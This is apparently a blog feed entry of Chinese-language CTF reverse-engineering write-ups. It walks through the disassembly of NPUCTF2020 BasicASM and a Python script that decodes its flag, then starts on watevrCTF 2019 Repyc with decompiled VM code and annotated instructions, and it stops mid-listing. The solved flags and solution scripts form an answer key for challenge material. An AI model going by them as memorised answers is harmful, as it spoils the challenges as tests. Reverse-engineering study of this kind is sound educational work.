        <description>&lt;img src="/post/reverse-from-1-to-2/cover.jpg" alt="Featured image of post Reverse from 1 to 2" /&gt;&lt;h2 id=&#34;npuctf2020basicasm&#34;&gt;[NPUCTF2020]BasicASM&lt;/h2&gt;
&lt;p&gt;纯考察汇编的题目，有考虑想办法改成正确的汇编形式然后编译用ida看，但感觉就失去意义了，于是硬啃汇编&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;00007FF7A8AC5A50  push        rbp  
00007FF7A8AC5A52  push        rdi  
00007FF7A8AC5A53  sub         rsp,238h  
00007FF7A8AC5A5A  lea         rbp,[rsp+20h]  
00007FF7A8AC5A5F  mov         rdi,rsp  
00007FF7A8AC5A62  mov         ecx,8Eh  
00007FF7A8AC5A67  mov         eax,0CCCCCCCCh  
00007FF7A8AC5A6C  rep stos    dword ptr [rdi]  
00007FF7A8AC5A6E  mov         rax,qword ptr [__security_cookie (07FF7A8AD3018h)]  
00007FF7A8AC5A75  xor         rax,rbp  
00007FF7A8AC5A78  mov         qword ptr [rbp+208h],rax  
00007FF7A8AC5A7F  lea         rcx,[__06A15900_ConsoleApplication@cpp (07FF7A8AD902Ah)]  
00007FF7A8AC5A86  call        __CheckForDebuggerJustMyCode (07FF7A8AC1122h)  
00007FF7A8AC5A8B  lea         rdx,[string &amp;quot;flag{this_is_a_fake_flag}&amp;quot; (07FF7A8ACF450h)]  
00007FF7A8AC5A92  lea         rcx,[flag]  
00007FF7A8AC5A96  call        std::basic_string&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,std::allocator&amp;lt;char&amp;gt; &amp;gt;::basic_string&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,std::allocator&amp;lt;char&amp;gt; &amp;gt; (07FF7A8AC15E1h)  
00007FF7A8AC5A9B  nop  
00007FF7A8AC5A9C  mov         dword ptr [p],0  
00007FF7A8AC5AA3  mov         i,0  
00007FF7A8AC5AAA  jmp         main+64h (07FF7A8AC5AB4h)  
00007FF7A8AC5AAC  mov         eax,i  
00007FF7A8AC5AAF  inc         eax  
00007FF7A8AC5AB1  mov         i,eax  
00007FF7A8AC5AB4  movsxd      rax,i  
00007FF7A8AC5AB8  mov         qword ptr [rbp+1F8h],rax  
00007FF7A8AC5ABF  lea         rcx,[flag]  
00007FF7A8AC5AC3  call        std::basic_string&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,std::allocator&amp;lt;char&amp;gt; &amp;gt;::length (07FF7A8AC122Bh)  
00007FF7A8AC5AC8  mov         rcx,qword ptr [rbp+1F8h]  
00007FF7A8AC5ACF  cmp         rcx,rax  
00007FF7A8AC5AD2  jae         main+1B2h (07FF7A8AC5C02h)  ; 无符号数比较，大于或等于时跳转
00007FF7A8AC5AD8  mov         eax,i  
00007FF7A8AC5ADB  and         eax,1  ; 取最后1位
00007FF7A8AC5ADE  cmp         eax,1  ; 判断奇偶
00007FF7A8AC5AE1  jne         main+126h (07FF7A8AC5B76h)  ; 偶数跳转（不相等跳转）
00007FF7A8AC5AE7  movsxd      rax,i  
00007FF7A8AC5AEB  mov         rdx,rax  
00007FF7A8AC5AEE  lea         rcx,[flag]  
00007FF7A8AC5AF2  call        std::basic_string&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,std::allocator&amp;lt;char&amp;gt; &amp;gt;::operator[] (07FF7A8AC1442h)  
00007FF7A8AC5AF7  movsx       eax,byte ptr [rax]  ; 取flag第i位
00007FF7A8AC5AFA  xor         eax,42h  ; 与0x42异或
00007FF7A8AC5AFD  mov         dword ptr [p],eax  ; 异或结果移到内存中
00007FF7A8AC5B00  mov         dl,30h  
00007FF7A8AC5B02  lea         rcx,[rbp+144h]  
00007FF7A8AC5B09  call        std::setfill&amp;lt;char&amp;gt; (07FF7A8AC1046h)  ; 用字符&#39;0&#39;进行填充
00007FF7A8AC5B0E  mov         qword ptr [rbp+1F8h],rax  
00007FF7A8AC5B15  mov         edx,2  
00007FF7A8AC5B1A  lea         rcx,[rbp+168h]  
00007FF7A8AC5B21  call        std::setw (07FF7A8AC10D2h)  ; 填充至2位
00007FF7A8AC5B26  mov         qword ptr [rbp+200h],rax  
00007FF7A8AC5B2D  lea         rdx,[std::hex (07FF7A8AC1488h)]  ; 以十六进制形式输出
00007FF7A8AC5B34  mov         rcx,qword ptr [__imp_std::cout (07FF7A8AD71C0h)]  
00007FF7A8AC5B3B  call        qword ptr [__imp_std::basic_ostream&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::operator&amp;lt;&amp;lt; (07FF7A8AD7160h)]  
00007FF7A8AC5B41  mov         rcx,qword ptr [rbp+200h]  
00007FF7A8AC5B48  mov         rdx,rcx  
00007FF7A8AC5B4B  mov         rcx,rax  
00007FF7A8AC5B4E  call        std::operator&amp;lt;&amp;lt;&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,__int64&amp;gt; (07FF7A8AC12F8h)  
00007FF7A8AC5B53  mov         rcx,qword ptr [rbp+1F8h]  
00007FF7A8AC5B5A  mov         rdx,rcx  
00007FF7A8AC5B5D  mov         rcx,rax  
00007FF7A8AC5B60  call        std::operator&amp;lt;&amp;lt;&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,char&amp;gt; (07FF7A8AC11A4h)  
00007FF7A8AC5B65  mov         edx,dword ptr [p]  
00007FF7A8AC5B68  mov         rcx,rax  
00007FF7A8AC5B6B  call        qword ptr [__imp_std::basic_ostream&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::operator&amp;lt;&amp;lt; (07FF7A8AD7158h)]  
00007FF7A8AC5B71  jmp         main+1ADh (07FF7A8AC5BFDh)  
00007FF7A8AC5B76  movsxd      rax,i  ; 偶数时跳转到这里，与奇数唯一的区别为没有异或运算
00007FF7A8AC5B7A  mov         rdx,rax  
00007FF7A8AC5B7D  lea         rcx,[flag]  
00007FF7A8AC5B81  call        std::basic_string&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,std::allocator&amp;lt;char&amp;gt; &amp;gt;::operator[] (07FF7A8AC1442h)  
00007FF7A8AC5B86  movsx       eax,byte ptr [rax]  
00007FF7A8AC5B89  mov         dword ptr [p],eax  
00007FF7A8AC5B8C  mov         dl,30h  
00007FF7A8AC5B8E  lea         rcx,[rbp+194h]  
00007FF7A8AC5B95  call        std::setfill&amp;lt;char&amp;gt; (07FF7A8AC1046h)  
00007FF7A8AC5B9A  mov         qword ptr [rbp+1F8h],rax  
00007FF7A8AC5BA1  mov         edx,2  
00007FF7A8AC5BA6  lea         rcx,[rbp+1B8h]  
00007FF7A8AC5BAD  call        std::setw (07FF7A8AC10D2h)  
00007FF7A8AC5BB2  mov         qword ptr [rbp+200h],rax  
00007FF7A8AC5BB9  lea         rdx,[std::hex (07FF7A8AC1488h)]  
00007FF7A8AC5BC0  mov         rcx,qword ptr [__imp_std::cout (07FF7A8AD71C0h)]  
00007FF7A8AC5BC7  call        qword ptr [__imp_std::basic_ostream&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::operator&amp;lt;&amp;lt; (07FF7A8AD7160h)]  
00007FF7A8AC5BCD  mov         rcx,qword ptr [rbp+200h]  
00007FF7A8AC5BD4  mov         rdx,rcx  
00007FF7A8AC5BD7  mov         rcx,rax  
00007FF7A8AC5BDA  call        std::operator&amp;lt;&amp;lt;&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,__int64&amp;gt; (07FF7A8AC12F8h)  
00007FF7A8AC5BDF  mov         rcx,qword ptr [rbp+1F8h]  
00007FF7A8AC5BE6  mov         rdx,rcx  
00007FF7A8AC5BE9  mov         rcx,rax  
00007FF7A8AC5BEC  call        std::operator&amp;lt;&amp;lt;&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,char&amp;gt; (07FF7A8AC11A4h)  
00007FF7A8AC5BF1  mov         edx,dword ptr [p]  
00007FF7A8AC5BF4  mov         rcx,rax  
00007FF7A8AC5BF7  call        qword ptr [__imp_std::basic_ostream&amp;lt;char,std::char_traits&amp;lt;char&amp;gt; &amp;gt;::operator&amp;lt;&amp;lt; (07FF7A8AD7158h)]  
00007FF7A8AC5BFD  jmp         main+5Ch (07FF7A8AC5AACh)  
00007FF7A8AC5C02  mov         dword ptr [rbp+1E4h],0  
00007FF7A8AC5C0C  lea         rcx,[flag]  
00007FF7A8AC5C10  call        std::basic_string&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,std::allocator&amp;lt;char&amp;gt; &amp;gt;::~basic_string&amp;lt;char,std::char_traits&amp;lt;char&amp;gt;,std::allocator&amp;lt;char&amp;gt; &amp;gt; (07FF7A8AC1302h)  
00007FF7A8AC5C15  mov         eax,dword ptr [rbp+1E4h]  
00007FF7A8AC5C1B  mov         edi,eax  
00007FF7A8AC5C1D  lea         rcx,[rbp-20h]  
00007FF7A8AC5C21  lea         rdx,[__xt_z+540h (07FF7A8ACEFE0h)]  
00007FF7A8AC5C28  call        _RTC_CheckStackVars (07FF7A8AC1596h)  
00007FF7A8AC5C2D  mov         eax,edi  
00007FF7A8AC5C2F  mov         rcx,qword ptr [rbp+208h]  
00007FF7A8AC5C36  xor         rcx,rbp  
00007FF7A8AC5C39  call        __security_check_cookie (07FF7A8AC1190h)  
00007FF7A8AC5C3E  lea         rsp,[rbp+218h]  
00007FF7A8AC5C45  pop         rdi  
00007FF7A8AC5C46  pop         rbp  
00007FF7A8AC5C47  ret  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单的说，过程就是一个循环，根据 &lt;code&gt;i&lt;/code&gt; 的奇偶进行判断，是否与 &lt;code&gt;0x42&lt;/code&gt; 进行异或，然后将结果以 2 位十六进制输出，所以只需要进行反向求解即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; n2s
cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n2s(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x662e61257b26301d7972751d6b2c6f355f3a38742d74341d61776d7d7d&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(cipher)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        print (chr(cipher[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print (chr(cipher[i]), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# flag{d0_y0u_know_x86-64_a5m?}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;watevrctf-2019repyc&#34;&gt;[watevrCTF 2019]Repyc&lt;/h2&gt;
&lt;p&gt;010看一眼，发现文件头好像没什么问题，直接用 &lt;code&gt;uncompyle6&lt;/code&gt; 转成python文件&lt;/p&gt;
&lt;p&gt;和VN的题一样，变量都成了乱码，阅读一下然后改一改&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;zero &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
one &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
two &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;function&lt;/span&gt;(op):
    i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; zero
    list_a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [zero] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; two &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; (two &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; two) &lt;span style=&#34;color:#75715e&#34;&gt;# [0] * 16&lt;/span&gt;
    list_b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [zero] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
    list_c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; op[i][zero] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;nop&amp;#39;&lt;/span&gt;:
        print (i, op[i])
        cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; op[i][zero]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;lower()
        args &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; op[i][one:]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_a[args[one]] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; list_a[args[two]]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xor&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_a[args[one]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; list_a[args[two]]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sub&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_a[args[one]] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; list_a[args[two]]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mul&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_a[args[one]] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; list_a[args[two]]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;div&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_a[args[one]] &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; list_a[args[two]]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;and&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_a[args[one]] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; list_a[args[two]]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;or&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_a[args[one]] &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; list_a[args[two]]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;nothing&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_a[args[zero]]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mov&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args[one]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;set_a&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_b[args[one]]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;clear&amp;#39;&lt;/span&gt;:
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; zero
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;input_b&amp;#39;&lt;/span&gt;:
            list_b[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(list_a[args[one]])
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;print_a&amp;#39;&lt;/span&gt;:
            print(list_a[args[zero]])
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c_pop&amp;#39;&lt;/span&gt;:
            i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_c&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pop()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;append_c&amp;#39;&lt;/span&gt;:
            list_a[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; zero
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(list_a[args[zero]])):
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; list_a[args[one]]:
                    list_a[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; one
                    i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_a[args[two]]
                    list_c&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(i)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xor_a&amp;#39;&lt;/span&gt;:
            str_next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(list_a[args[zero]])):
                str_next &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(ord(list_a[args[zero]][j]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; list_a[args[one]])
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str_next
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sub_a&amp;#39;&lt;/span&gt;:
            str_next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(list_a[args[zero]])):
                str_next &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(ord(list_a[args[zero]][j]) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; list_a[args[one]])
            list_a[args[zero]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str_next
        print (list_a)
        print (list_b)
        print (list_c)
        print ()
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; one


function(
    [
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mov&amp;#39;&lt;/span&gt;, zero, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Authentication token: &amp;#39;&lt;/span&gt;],
        &lt;span style=&#34;color:#75715e&#34;&gt;# 将这个字符串放到list a的0号位置&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;input_b&amp;#39;&lt;/span&gt;, zero, zero],
        &lt;span style=&#34;color:#75715e&#34;&gt;# 将输入放到list b的0号位置&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mov&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜ&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x97&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ÉïÙãäãÖÓ&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x9a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ÕÙÛ&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x99&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;á×äÕà©â«³£ï²ÕÔÈ·±â¨ë&amp;#39;&lt;/span&gt;],
        &lt;span style=&#34;color:#75715e&#34;&gt;# 将这个字符串放到list a的6号位置&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mov&amp;#39;&lt;/span&gt;, two, two &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; two &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; one) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; two &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; (two &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; one)],
        &lt;span style=&#34;color:#75715e&#34;&gt;# 将120放到list a的2号位置&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mov&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;],
        &lt;span style=&#34;color:#75715e&#34;&gt;# 将15放到list a的4号位置&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mov&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, one],
        &lt;span style=&#34;color:#75715e&#34;&gt;# 将1放到list a的3号位置&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mul&amp;#39;&lt;/span&gt;, two, two, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;],
        &lt;span style=&#34;color:#75715e&#34;&gt;# list a的2号位置等于2号位置*3号位置，即不变&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;, two, two, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;],
        &lt;span style=&#34;color:#75715e&#34;&gt;# list a的2号位置等于2号位置+4号位置，即120变为135&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;nothing&amp;#39;&lt;/span&gt;, zero, two],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;clear&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;],
        &lt;span style=&#34;color:#75715e&#34;&gt;# list a的3号位置清零&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xor_a&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;],
        &lt;span style=&#34;color:#75715e&#34;&gt;# 6号位置中每一个字符与3异或&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mov&amp;#39;&lt;/span&gt;, zero, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Thanks.&amp;#39;&lt;/span&gt;],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mov&amp;#39;&lt;/span&gt;, one, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Authorizing access...&amp;#39;&lt;/span&gt;],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;print_a&amp;#39;&lt;/span&gt;, zero],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;set_a&amp;#39;&lt;/span&gt;, zero, zero],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xor_a&amp;#39;&lt;/span&gt;, zero, two], &lt;span style=&#34;color:#75715e&#34;&gt;# 输入异或135&lt;/span&gt;
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sub_a&amp;#39;&lt;/span&gt;, zero, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;], &lt;span style=&#34;color:#75715e&#34;&gt;# 输入减15&lt;/span&gt;
